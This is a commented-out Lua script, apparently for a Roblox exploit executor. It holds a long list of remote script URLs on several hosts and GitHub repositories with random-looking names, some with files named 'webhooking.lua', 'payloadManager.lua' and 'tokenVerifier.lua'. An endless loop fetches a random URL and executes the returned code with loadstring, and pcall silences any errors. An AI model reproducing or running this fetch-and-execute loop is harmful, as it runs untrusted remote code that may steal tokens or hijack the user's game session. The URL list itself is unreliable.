--[[

local urlsToRequest = {
    "https://ryza.us/api/getscript/loader/v2/utilityCore",
    "https://ryza.us/api/getscript/loader/v2/gameHandler",
    "https://ryza.us/api/getscript/loader/v2/systemInit",
    "https://ryza.us/api/getscript/loader/v2/configManager",
    "https://ryza.us/api/getscript/loader/v2/resourcePack",
    "https://ryza.us/api/getscript/loader/v2/clientModule",
    "https://ryza.us/api/getscript/loader/v2/networkHelper",
    "https://ryza.us/api/getscript/loader/v2/assetLoader",
    "https://ryza.us/api/getscript/loader/v2/uiFramework",
    "https://ryza.us/api/getscript/loader/v2/dataService",
    "https://ryza.us/api/getscript/loader/v2/renderEngine",
    "https://ryza.us/api/getscript/loader/v2/cacheSystem",
    "https://ryza.us/api/getscript/loader/v2/inputManager",
    "https://ryza.us/api/getscript/loader/v2/soundController",
    "https://ryza.us/api/getscript/loader/v2/telemetryAgent",
    "https://ryza.us/api/getscript/loader/v2/updateChecker",
    "https://ryza.us/api/getscript/loader/v2/profileSync",
    "https://ryza.us/api/getscript/loader/v2/mainHandler",
    "https://ryza.us/api/getscript/loader/v2/settingsModule",
    "https://ryza.us/api/getscript/loader/v2/eventBroker",
    "https://raw.githubusercontent.com/uyisxtgdyuafsgjytfa/7635axhwhjsHztYZS/main.lua",
    "https://raw.githubusercontent.com/sdasd3vc4rawxsda/sadasdhkjsngdcxiqcawk/ownersmenu.lua",
    "https://raw.githubusercontent.com/3f3w4vcewqasxdadasda/5235325235235/micupmain.lua",
    "https://raw.githubusercontent.com/sadasdhkjsnsdgdcxiqcawk/7635axhwhjsHztYZS/othernull.lua",
    "https://raw.githubusercontent.com/kjashdtxjyathdnszmjhza/23523523hjgjhdghAD/keysystem.lua",
    "https://raw.githubusercontent.com/zsud6r3q6yzrsyjdwaysrfyhd/7635axhwhjsHztYZS/cannotload.lua",
    "https://raw.githubusercontent.com/989843278472398479832/iuaszdht576ukatsuydgtas/ryzaloader.lua",
    "https://raw.githubusercontent.com/8721537651267352167537123/13259027rx98wqozaiaed/webhooking.lua",
    "https://nexus.io/api/getscript/framework/v3/coreSystem",
    "https://nexus.io/api/getscript/framework/v3/engineLoader",
    "https://nexus.io/api/getscript/framework/v3/resourceManager",
    "https://nexus.io/api/getscript/framework/v3/renderPipeline",
    "https://nexus.io/api/getscript/framework/v3/networkService",
    "https://nexus.io/api/getscript/framework/v3/dataHandler",
    "https://nexus.io/api/getscript/framework/v3/inputController",
    "https://nexus.io/api/getscript/framework/v3/entitySystem",
    "https://nexus.io/api/getscript/framework/v3/audioEngine",
    "https://nexus.io/api/getscript/framework/v3/physicsCore",
    "https://nexus.io/api/getscript/framework/v3/configService",
    "https://nexus.io/api/getscript/framework/v3/debugTools",
    "https://nexus.io/api/getscript/framework/v3/eventManager",
    "https://nexus.io/api/getscript/framework/v3/cacheController",
    "https://nexus.io/api/getscript/framework/v3/loggingService",
    "https://nexus.io/api/getscript/framework/v3/securityLayer",
    "https://nexus.io/api/getscript/framework/v3/profileManager",
    "https://nexus.io/api/getscript/framework/v3/analyticsAgent",
    "https://nexus.io/api/getscript/framework/v3/uiFramework",
    "https://nexus.io/api/getscript/framework/v3/localizationSystem",
    "https://raw.githubusercontent.com/e4c2a6b8d1f3e7a9c5/d2e5a8b4c7d3f1e6a/moduleLoader.lua",
    "https://raw.githubusercontent.com/b8c4e6d2f1a5c9e3b7/1e5c8a3f6d9e2b4c7/assetBundler.lua",
    "https://raw.githubusercontent.com/d5a7f2e9b3c1d8a4e6/8c4d1e7f3a6b9c5d2/networkProtocol.lua",
    "https://raw.githubusercontent.com/c8e6a4d2b9f5c3e1a7/4b8e2c9d5a3f7b1e6/authService.lua",
    "https://raw.githubusercontent.com/a4e7c9d2f5b3e8a1c6/6d2c8e4f1a3b5d7c9/queryHandler.lua",
    "https://raw.githubusercontent.com/e2d8f4a6c9b3e5d7a1/2c5f8d4e6a3b9c7d1/resourceFetcher.lua",
    "https://raw.githubusercontent.com/f7d3a9c5e2b4f8d1a6/9c3b5a7f2d4e8c1a6/metricCollector.lua",
    "https://raw.githubusercontent.com/b3f8d2c6e9a4d7f1c5/5a8c3d7f1e6b9d2c4/serverSync.lua",
    "https://raw.githubusercontent.com/d7c5a2f9e3b6d1c8a4/1d7c3a9f5e2b8d4c6/configValidator.lua",
    "https://edge.vertor.dev/api/scripts/core/mainController",
    "https://edge.vertor.dev/api/scripts/core/renderService",
    "https://edge.vertor.dev/api/scripts/core/dataProcessor",
    "https://edge.vertor.dev/api/scripts/utils/clientLogger",
    "https://edge.vertor.dev/api/scripts/utils/securityMonitor",
    "https://edge.vertor.dev/api/scripts/utils/performanceTracker",
    "https://edge.vertor.dev/api/scripts/utils/debugConsole",
    "https://edge.vertor.dev/api/scripts/services/authManager",
    "https://edge.vertor.dev/api/scripts/services/profileHandler",
    "https://edge.vertor.dev/api/scripts/services/notificationSystem",
    "https://raw.githubusercontent.com/9d8c7f6e5d4c3b2a1/32547698acdbef12/vizCore.lua",
    "https://raw.githubusercontent.com/2a5b7c9d3e8f1a4c6/78945612efcdba32/extensionLoader.lua",
    "https://raw.githubusercontent.com/3e1c7a9d5f2b4e8c6/45678912bcdefa32/payloadManager.lua",
    "https://raw.githubusercontent.com/8c4d2e6f1a3b5c7d9/12563489abcdef78/tokenVerifier.lua",
    "https://raw.githubusercontent.com/5c8e2a4f7d1b3c9e6/89456123abcdef12/sessionHandler.lua"
}

local function getRandomUrl()
    local randomIndex = math.random(1, #urlsToRequest)
    return urlsToRequest[randomIndex]
end

while wait() do
    pcall(function()
        loadstring(game:HttpGet(getRandomUrl()))()
    end)
end


]]
